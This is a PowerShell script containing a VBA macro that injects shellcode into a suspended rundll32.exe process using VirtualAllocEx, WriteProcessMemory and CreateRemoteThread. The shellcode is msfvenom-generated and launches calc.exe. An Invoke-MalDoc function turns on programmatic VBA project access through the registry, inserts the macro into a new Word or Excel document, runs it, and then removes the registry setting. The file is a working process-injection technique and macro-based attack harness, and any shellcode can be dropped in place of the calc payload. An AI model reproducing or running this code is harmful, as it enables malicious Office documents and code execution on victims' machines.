$injectMacro = @"
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Declare PtrSafe Function createRemoteThread Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, _
    ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    lpParameter As Long, _
    ByVal dwCreationFlags As Long, _
    lpThreadID As Long) As LongPtr

Private Declare PtrSafe Function virtualAllocEx Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, _
    ByVal lpAddr As Long, _
    ByVal lSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function writeProcessMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, _
    ByVal lDest As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long, _
    ByVal LengthWrote As LongPtr) As Boolean

Private Declare PtrSafe Function createProcessA Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    lpProcessAttributes As Any, _
    lpThreadAttributes As Any, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    lpEnvironment As Any, _
    ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Boolean

Private Declare PtrSafe Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As LongLong

Private Sub Execute()

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Dim sc As String
Dim scLen As Long
Dim byteArray() As Byte
Dim memoryAddress As LongLong
Dim pHandle As LongLong
Dim sNull As String
Dim sInfo As STARTUPINFO
Dim pInfo As PROCESS_INFORMATION

' ./msfvenom --arch x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c
sc = "fc4883e4f0e8c00000004151415052"
sc = sc & "51564831d265488b5260488b521848"
sc = sc & "8b5220488b7250480fb74a4a4d31c9"
sc = sc & "4831c0ac3c617c022c2041c1c90d41"
sc = sc & "01c1e2ed524151488b52208b423c48"
sc = sc & "01d08b80880000004885c074674801"
sc = sc & "d0508b4818448b40204901d0e35648"
sc = sc & "ffc9418b34884801d64d31c94831c0"
sc = sc & "ac41c1c90d4101c138e075f14c034c"
sc = sc & "24084539d175d858448b40244901d0"
sc = sc & "66418b0c48448b401c4901d0418b04"
sc = sc & "884801d0415841585e595a41584159"
sc = sc & "415a4883ec204152ffe05841595a48"
sc = sc & "8b12e957ffffff5d48ba0100000000"
sc = sc & "000000488d8d0101000041ba318b6f"
sc = sc & "87ffd5bbf0b5a25641baa695bd9dff"
sc = sc & "d54883c4283c067c0a80fbe07505bb"
sc = sc & "4713726f6a00594189daffd563616c"
sc = sc & "632e65786500"

scLen = Len(sc) / 2
ReDim byteArray(0 To scLen)

For i = 0 To scLen - 1
    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Mid(sc, pos, 2)
    byteArray(i) = Val("&H" & Value)
Next

res = createProcessA(sNull, _
    "C:\Windows\System32\rundll32.exe", _
    ByVal 0&, _
    ByVal 0&, _
    ByVal 1&, _
    ByVal 4&, _
    ByVal 0&, _
    sNull, _
    sInfo, _
    pInfo)
Debug.Print "[+] CreateProcessA() returned: " & res

newAllocBuffer = virtualAllocEx(pInfo.hProcess, _
    0, _
    UBound(byteArray), _
    MEM_COMMIT, _
    PAGE_EXECUTE_READWRITE)
Debug.Print "[+] VirtualAllocEx() returned: 0x" & Hex(newAllocBuffer)

Debug.Print "[*] Writing memory..."
For Offset = 0 To UBound(byteArray)
    myByte = byteArray(Offset)
    res = writeProcessMemory(pInfo.hProcess, _
        newAllocBuffer + Offset, _
        byteArray(Offset), _
        1, _
        ByVal 0&)
Next Offset
Debug.Print "[+] WriteProcessMemory() returned: " & res

Debug.Print "[+] Executing shellcode now..."
res = createRemoteThread(pInfo.hProcess, _
    0, _
    0, _
    newAllocBuffer, _
    0, _
    0, _
    0)

End Sub
"@

function Invoke-MalDoc {
    Param(
        [Parameter(Position = 1, Mandatory = $False)]
        [String]$officeVersion,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateSet("Word", "Excel")]
        [String]$officeProduct,

        [Parameter(Position = 3, Mandatory = $false)]
        [String]$sub = "Test",

        [Parameter(Position = 4, Mandatory = $false, ParameterSetName = "code")]
        [switch]$noWrap
    )

    $app = New-Object -ComObject "$officeProduct.Application"
    if (-not $officeVersion) { $officeVersion = $app.Version } 
    $Key = "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\"
    if (-not (Test-Path $key)) { New-Item $Key }
    Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1

    if (-not $noWrap) {
        $macroCode = $injectMacro
    }

    if ($officeProduct -eq "Word") {
        $doc = $app.Documents.Add()
    }
    else {
        $doc = $app.Workbooks.Add()
    }
    $comp = $doc.VBProject.VBComponents.Add(1)
    $comp.CodeModule.AddFromString($macroCode)
    $app.Run($sub)
    $doc.Close(0)
    $app.Quit()
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) | Out-Null
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\" -Name 'AccessVBOM' -ErrorAction Ignore
}
